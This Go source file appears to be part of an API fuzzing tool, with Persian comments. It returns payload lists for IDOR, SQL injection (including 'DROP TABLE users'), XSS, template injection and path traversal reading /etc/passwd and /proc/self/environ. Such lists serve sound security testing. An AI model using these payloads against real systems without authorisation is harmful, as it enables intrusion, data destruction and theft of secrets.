package api_fuzzer

// PayloadGroup گروهی از Payloadها برای یک نوع خاص از پارامتر
type PayloadGroup struct {
	Type        ParamType
	Payloads    []string
	Description string
}

// GetSmartPayloads بر اساس نوع پارامتر، Payloadهای مرتبط را برمی‌گرداند
func GetSmartPayloads(pType ParamType) []PayloadGroup {
	switch pType {
	case TypeNumeric:
		return []PayloadGroup{
			{
				Type:        TypeNumeric,
				Description: "IDOR Test (Increment/Decrement)",
				Payloads:    []string{"0", "-1", "999999"},
			},
			{
				Type:        TypeNumeric,
				Description: "SQLi Basic Test",
				Payloads:    []string{"1' OR '1'='1", "1' AND 1=0--", "1; DROP TABLE users--"},
			},
		}
	case TypeString:
		return []PayloadGroup{
			{
				Type:        TypeString,
				Description: "XSS Basic Test",
				Payloads:    []string{"<script>alert(1)</script>", "'\"><img src=x onerror=alert(1)>", "{{7*7}}"}, // SSTI
			},
			{
				Type:        TypeString,
				Description: "LFI (Local File Inclusion) Test",
				Payloads:    []string{"../../../etc/passwd", "....//....//....//etc/passwd", "/proc/self/environ"},
			},
		}
	case TypeUUID:
		return []PayloadGroup{
			{
				Type:        TypeUUID,
				Description: "UUID Manipulation / Null Byte",
				Payloads:    []string{"00000000-0000-0000-0000-000000000000", "invalid-uuid-format"},
			},
		}
	default:
		return []PayloadGroup{
			{
				Type:        TypeUnknown,
				Description: "Generic Fuzzing",
				Payloads:    []string{"admin", "test", "' OR 1=1--"},
			},
		}
	}
}